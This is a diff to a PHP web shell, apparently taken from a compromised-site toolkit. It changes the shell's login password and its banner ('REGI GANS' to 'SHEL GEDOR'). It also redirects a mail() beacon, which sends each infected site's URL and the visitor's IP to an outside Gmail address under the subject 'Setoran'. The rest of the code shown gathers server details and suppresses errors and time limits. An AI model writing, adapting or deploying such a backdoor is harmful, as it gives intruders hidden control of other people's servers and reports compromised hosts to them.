@@ -13,7 +13,7 @@ error_reporting(0);
 @ini_set('max_execution_time', 0);
 @ini_set('output_buffering', 0);
 @ini_set('display_errors', 0);
-$MyPass = 'soficantik'; // Password Default: RegiGans
+$MyPass = 'Rahasia13'; // Password Default: RegiGans
 if (empty($_SESSION['login'])) {
     pausi_login();
 }
@@ -129,7 +129,7 @@ $soft      = $_SERVER['SERVER_SOFTWARE'];
 $mysql     = (function_exists('mysql_connect')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
 $curl      = (function_exists('curl_version')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
 $mail      = (function_exists('mail')) ? "<font color=green>ON</font>" : "<font color=red>OFF</font>";
-echo "<center><font size='6px' color='lavender'>REGI GANS</font><br></center>
+echo "<center><font size='6px' color='lavender'>SHEL GEDOR</font><br></center>
     <div class='pausi'>
         <p>" . php_uname() . "<br>" . ip_info() . "<br>
         $soft <br>
@@ -812,7 +812,7 @@ function aksiJump($dir, $ip)
 set_time_limit(0);
 ini_set('memory_limit', '64M');
 header('Content-Type: text/html; charset=UTF-8');
-$tujuanmail = 'PurwokertoXploit@gmail.com, tobeltobel86@gmail.com';
+$tujuanmail = 'ridwannegativ@gmail.com';
 $x_path = "http://" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI'];
 $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
 mail($tujuanmail, "Setoran", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]");
